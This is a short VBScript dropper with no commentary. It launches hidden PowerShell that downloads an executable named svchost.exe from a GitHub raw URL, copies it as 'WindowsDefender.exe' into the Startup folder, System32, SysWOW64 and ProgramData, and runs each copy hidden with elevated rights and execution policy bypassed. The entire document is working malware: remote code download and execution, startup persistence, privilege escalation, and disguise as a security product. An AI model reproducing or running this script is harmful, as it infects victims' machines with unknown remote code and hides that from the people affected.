Set objShell = CreateObject("WScript.Shell")
Dim url, destinations, i, destPath

url = "https://github.com/AmjadBalls/Ramizjaber12/raw/refs/heads/main/svchost.exe"

destinations = Array( _
    objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\WindowsDefender.exe", _
    "C:\Windows\SysWOW64\WindowsDefender.exe", _
    "C:\Windows\System32\WindowsDefender.exe", _
    "C:\ProgramData\WindowsDefender.exe" _
)

For i = LBound(destinations) To UBound(destinations)
    destPath = destinations(i)
    objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
        """Invoke-WebRequest -Uri '" & url & "' -OutFile '" & destPath & "'; " & _
        "Start-Process '" & destPath & "' -WindowStyle Hidden -Verb RunAs""", 0, False
Next
